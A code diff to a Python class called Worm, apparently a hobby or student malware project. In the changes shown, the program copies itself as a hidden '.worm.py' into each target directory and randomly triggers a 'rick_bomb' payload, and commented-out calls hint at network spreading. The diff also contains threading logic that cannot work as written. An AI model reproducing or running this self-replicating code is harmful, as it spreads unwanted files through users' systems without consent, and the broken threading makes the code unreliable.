@@ -143,12 +143,9 @@ class Worm:
     
     def create_new_worm(self):
         try:
-            if self.russian_roulette():
-                self.rick_bomb()
             for directory in self.target_dir_list:
                 destination = os.path.join(directory, ".worm.py")
                 shutil.copyfile(self.own_path, destination)
-            
         except:
             logging.warning("exception occurred: cannot create new worm")
     
@@ -199,14 +196,8 @@ class Worm:
         
     def russian_roulette(self):
         num = random.randint(0, 5)
-        file1 = open("log.txt", "a")
-        file1.write("\n")
-        file1.write(num)
-        file1.close
         if ROULETTE == num:
-            return True
-        else:
-            return False
+            self.rick_bomb()
         
     def start_worm_actions(self):
         print(self.target_dir_list)
@@ -217,10 +208,14 @@ class Worm:
         self.list_directories(self.path)
         
         try:
-            self.create_new_worm()
+            self.threader.append(self.russian_roulette())
+            self.threader.append(self.create_new_worm())
+            self.threader.start()
+            self.threader.join()     
         except:
             logging.warning("something went wrong")
         
+       
         #self.copy_existing_files()
         #self.time_to_rick()
         #self.connection_iterator()
@@ -232,5 +227,7 @@ if __name__=="__main__":
     current_directory = os.path.abspath("")
     worm = Worm(path=current_directory)
     worm.start_worm_actions()
+    with open('log.txt', 'w') as f:
+        f.write(f"{perf_counter() - worm.start:.5f}")
     
     
